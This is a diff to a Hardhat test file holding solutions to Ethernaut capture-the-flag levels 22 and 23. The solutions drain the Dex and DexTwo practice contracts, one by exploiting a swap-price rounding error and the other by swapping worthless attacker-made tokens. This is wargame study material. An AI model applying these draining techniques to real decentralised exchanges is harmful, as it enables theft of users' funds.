@@ -275,15 +275,16 @@ describe("Ethernaut", function () {
 			const token_2 = await ethers.deployContract("SwappableToken", [dex, "Token 2", "T2", 110], { signer: owner });
 			await dex.connect(owner).setTokens(token_1, token_2);
 			// --------------------
-			await dex.connect(owner).approve(owner, 220);
-			// send 10 of each tokens to the hacker for level preparation
+			await token_1.connect(owner).approve(owner, ethers.MaxUint256);
+			await token_2.connect(owner).approve(owner, ethers.MaxUint256);
+			// level preparation, send 10 of each tokens to the hacker
 			await token_1.connect(owner).transferFrom(owner, hacker, 10);
 			await token_2.connect(owner).transferFrom(owner, hacker, 10);
-			// send 100 of each tokens to DEX for level preparation
+			// level preparation, send 100 of each tokens to DEX
 			await token_1.connect(owner).transferFrom(owner, dex, 100);
 			await token_2.connect(owner).transferFrom(owner, dex, 100);
 			// --------------------
-			await dex.connect(hacker).approve(dex, 220);
+			await dex.connect(hacker).approve(dex, ethers.MaxUint256); // allow DEX to swap hacker's tokens
 			await dex.connect(hacker).swap(token_1, token_2, 10); // exploit the rounding error in getSwapPrice()
 			await dex.connect(hacker).swap(token_2, token_1, 20);
 			await dex.connect(hacker).swap(token_1, token_2, 24);
@@ -292,6 +293,44 @@ describe("Ethernaut", function () {
 			await dex.connect(hacker).swap(token_2, token_1, 45);
 			const balanceCurrentToken1 = await dex.balanceOf(token_1, dex);
 			expect(balanceCurrentToken1).to.equal(0, "Failed to pass level 22."); // drain one of the tokens to pass the level
+		});
+	});
+
+	describe("Level 23 - DexTwo", async () => {
+		it("Exploit", async () => {
+			const dex = await ethers.deployContract("DexTwo", { from: owner });
+			const token_1 = await ethers.deployContract("SwappableToken", [dex, "Token 1", "T1", 110], { signer: owner }); // create two different ERC20 tokens
+			const token_2 = await ethers.deployContract("SwappableToken", [dex, "Token 2", "T2", 110], { signer: owner });
+			await dex.connect(owner).setTokens(token_1, token_2);
+			// --------------------
+			await token_1.connect(owner).approve(owner, ethers.MaxUint256);
+			await token_2.connect(owner).approve(owner, ethers.MaxUint256);
+			// level preparation, send 10 of each tokens to the hacker
+			await token_1.connect(owner).transferFrom(owner, hacker, 10);
+			await token_2.connect(owner).transferFrom(owner, hacker, 10);
+			// level preparation, send 100 of each tokens to DEX
+			await token_1.connect(owner).transferFrom(owner, dex, 100);
+			await token_2.connect(owner).transferFrom(owner, dex, 100);
+			// --------------------
+			const exploit_1 = await ethers.deployContract("DexTwoExploit", ["Exploit 1", "E1", 200], { signer: hacker }); // create two different ERC20 exploit tokens
+			const exploit_2 = await ethers.deployContract("DexTwoExploit", [ "Exploit 2", "E2", 200], { signer: hacker });
+
+			await exploit_1.connect(hacker).approve(hacker, ethers.MaxUint256);
+			await exploit_2.connect(hacker).approve(hacker, ethers.MaxUint256);
+
+			await exploit_1.connect(hacker).transferFrom(hacker, dex, 100); // send 100 of each exploit tokens to DEX
+			await exploit_2.connect(hacker).transferFrom(hacker, dex, 100); // this will make getSwapPrice() return "amount * 1/1", meaning the swap ratio will be 1:1
+
+			await exploit_1.connect(hacker).approve(dex, ethers.MaxUint256);
+			await exploit_2.connect(hacker).approve(dex, ethers.MaxUint256);
+
+			await dex.connect(hacker).swap(exploit_1, token_1, 100);
+			await dex.connect(hacker).swap(exploit_2, token_2, 100);
+			
+			const balanceCurrentToken1 = await dex.balanceOf(token_1, dex);
+			const balanceCurrentToken2 = await dex.balanceOf(token_2, dex);
+			expect(balanceCurrentToken1).to.equal(0, "Failed to pass level 23."); // drain all of the tokens to pass the level
+			expect(balanceCurrentToken2).to.equal(0, "Failed to pass level 23.");
 		});
 	});
 });
